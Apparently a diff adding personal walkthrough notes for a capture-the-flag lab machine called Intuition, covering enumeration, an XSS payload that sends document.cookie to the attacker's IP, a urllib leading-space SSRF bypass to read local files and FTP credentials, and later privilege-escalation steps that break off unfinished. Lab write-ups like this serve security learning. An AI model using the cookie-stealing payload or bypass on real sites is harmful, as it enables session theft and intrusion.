@@ -1,3 +1,55 @@
 Name: Intuition
 Difficulty: Hard
 OS: Linux
+
+1) nmap scan:
+port service
+22   ssh
+80   http
+
+2.0) add comprezzor.htb to /etc/hosts
+2.1) the http service offers a compression service using LZMA and since recently CVE-2024-3094 came out I entered the rabbit hole for like 2 hours
+2.2) ffuf subdomain enum with common wordlist -> comprezzor.htb report.comprezzor.htb auth.comprezzor.htb dashboard.comprezzor.htb
+2.3) report submission form has got xss
+2.4.1) python3 -m http.server
+2.4.2) ssrf via xss using <img src=q onerror="fetch('http://<my_ip>/?cookie='+document.cookie)">
+
+3.1) webdev dashboard login with the obtained cookies
+3.2) set high-priority function to use on reports, plus resolved/delete
+3.3) set high priority seems to send another cookie of admin
+
+4.1) admin dashboard has many funcitons: full report list - create backup - create pdf report
+4.2) usually create pdf is vulnerable in this kind of boxes and the exploiting of wkhtmltopdf 0.12.6 seems to be the way to go
+4.3) create a local webserver and insert the url on the create pdf funciton -> prints the list of my file system
+4.4) it doesn't seem to be exploitable on the remote server btw
+4.5) open a port for listeing with netcat and send a request to my netcat -> User-Agent: Python-urllib/3.11 -> CVE-2023–24329
+4.6) add a blank space in front of the url to bypass the backend check
+4.7) download the remote /etc/passwd with this url: file://///etc/passwd
+4.8) search in file:///proc/self/cmdline for apps that are being used -> find python3/app/code/app.py
+4.9) find that ftp server is being used and credentials
+4.10) search for files in the ftp server with ftp://ftp_admin:<password>@ftp.local
+4.11) the note contains the passphrase and the ssh private key
+
+5.1) need to leak the username to use the ssh priv key but we have the passphrase to get it: ssh-keygen -p -f private_key(id_rsa) -> dev_acc@local
+5.2) ssh to get the user flag
+
+6.0) enumerate A LOT 
+6.1) finding users with cat /etc/passwd -> adam dev_acc lopez
+6.2) linpeas and netstat shows the open ports -> ligolo to access the services -> selenium on port 4444 -> not useful
+6.3) found a users database containing usernames and hashes on /var/www/app/blueprints/auth/ -> adam password crack with hashcat 
+6.4) ssh with those creds is not working
+6.5) ftp with those creds works and adam had some files into /backup/runner1/ folder
+6.6) cat the files to read the content and find the first part of an auth key and the second part in md5 format
+6.7) crack the last 4 md5 digits with a custom script or your own method
+6.8) the binary file cat tells us that it is using Ansible: ansible-galaxy and ansible-playbook with an error output
+
+7.1) dev_acc can access the /opt/ folder but can't access runner2 and playbook folder because those are owned by the admin
+
+8.1) lopez credentials found with zgrep -i lopez /var/log/suricata/*.gz
+8.2) lopez can access the /opt/runner2 folder and also sudo -l shows up that lopez can run as admin runner2
+8.3) https://gtfobins.github.io/gtfobins/ansible-playbook/ priv esc ansible playbook -> doesn't work
+8.4) usage says json file as argument
+8.5) after infinite researches and docs readings craft the json file 
+
+
+
